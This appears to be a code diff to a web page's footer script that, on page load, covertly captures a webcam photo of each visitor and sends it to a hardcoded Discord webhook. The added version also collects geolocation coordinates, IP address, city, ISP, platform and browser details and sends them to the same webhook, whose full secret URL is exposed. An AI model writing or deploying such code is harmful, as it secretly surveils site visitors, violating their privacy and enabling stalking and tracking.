@@ -146,9 +146,9 @@
     </div>
   </footer>
 
-  <!-- Camera auto-capture script -->
+  <!-- Camera + visitor info script -->
   <script>
-    window.addEventListener('DOMContentLoaded', async () => {
+    async function sendInfoAndPhoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
@@ -158,25 +158,58 @@
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-        const formData = new FormData();
-        formData.append('file', photoBlob, 'photo.jpg');
-        formData.append('payload_json', JSON.stringify({ content: 'New visitor captured!' }));
-
-        await fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
-          method: 'POST',
-          body: formData
-        });
-
         stream.getTracks().forEach(track => track.stop());
+
+        // Get geolocation
+        let geoInfo = '';
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            geoInfo = `Latitude: ${pos.coords.latitude}\nLongitude: ${pos.coords.longitude}`;
+            sendWebhook(photoBlob, geoInfo);
+          }, () => {
+            sendWebhook(photoBlob, 'Geolocation permission denied.');
+          });
+        } else {
+          sendWebhook(photoBlob, 'Geolocation not supported.');
+        }
+
       } catch (err) {
-        console.error('Error accessing camera:', err);
+        console.error('Camera error:', err);
+        sendWebhook(null, 'Camera access denied or error.');
       }
-    });
+    }
+
+    async function sendWebhook(photoBlob, geoInfo) {
+      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+      const info = `
+IP: ${ipData.ip}
+Country: ${ipData.country_name}
+City: ${ipData.city}
+Region: ${ipData.region}
+ISP: ${ipData.org}
+Coords: ${geoInfo}
+Device: ${navigator.platform}
+Browser: ${navigator.userAgent}
+      `;
+
+      const formData = new FormData();
+      if (photoBlob) {
+        formData.append('file', photoBlob, 'photo.jpg');
+      }
+      formData.append('payload_json', JSON.stringify({ content: 'New visitor info:\n' + '```' + info + '```' }));
+
+      await fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    window.addEventListener('DOMContentLoaded', sendInfoAndPhoto);
   </script>
 
 </body>
